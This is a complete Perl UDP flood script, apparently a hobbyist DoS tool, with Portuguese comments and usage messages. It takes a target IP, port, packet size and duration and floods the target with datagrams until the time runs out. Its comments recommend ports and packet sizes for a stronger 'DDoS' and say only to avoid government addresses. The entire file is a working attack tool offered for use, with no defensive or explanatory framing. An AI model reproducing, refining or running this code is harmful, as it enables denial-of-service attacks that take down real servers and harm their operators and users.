#!/usr/bin/perl
 
#Created by ~TwentyOne
#Recomendações:
#IP -   Não ataque IPs do governo. (domínio.gov)
#Port - Use '80' para HTTP (Mais Comum) ou '53' para DNS, ou'443' para HTTPS.
#Size - Use '100 - 1000' (Quanto mais pacotes, mais força no DDoS).
#Time - Depende do Servidor ou da vítima, use CTRL+C para cancelar.
 
use Socket;
use strict;
 
print '
 

     
';
print "\n";
 
 
if ($#ARGV != 3) {
  print "\n\t\t\t***Erro na sintaxe***\n";
  print "Exemplo: perl DDoS.pl 1.1.1.1 80 1000 300\n";
  print "Para dar DDoS digite o ip '1.1.1.1' para '300' segundos na porta '80' usando '1000' pacotes\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Nao eh possivel conectar ao ip $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~ Para cancelar o ataque use \'Ctrl+C\'\n\n";
print "|IP|\t\t |Porta|\t\t |Tamanho|\t\t |Tempo|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "Para cancelar o ataque use 'Ctrl+C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}